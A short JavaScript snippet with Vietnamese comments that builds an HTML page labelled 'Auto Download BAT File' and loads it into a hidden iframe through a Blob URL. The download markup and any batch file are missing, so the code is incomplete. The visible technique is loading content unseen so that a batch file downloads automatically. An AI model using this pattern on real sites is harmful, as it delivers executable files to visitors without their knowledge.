// Nội dung của tệp HTML const htmlContent = ` Auto Download BAT File `; // Tạo Blob từ HTML content const blob = new Blob([htmlContent], { type: 'text/html' }); // Tạo URL data từ Blob const url = URL.createObjectURL(blob); // Tạo một iframe ẩn để chạy tệp HTML const iframe = document.createElement('iframe'); iframe.style.display = 'none'; // Ẩn iframe iframe.src = url; // Thêm iframe vào trang web document.body.appendChild(iframe);
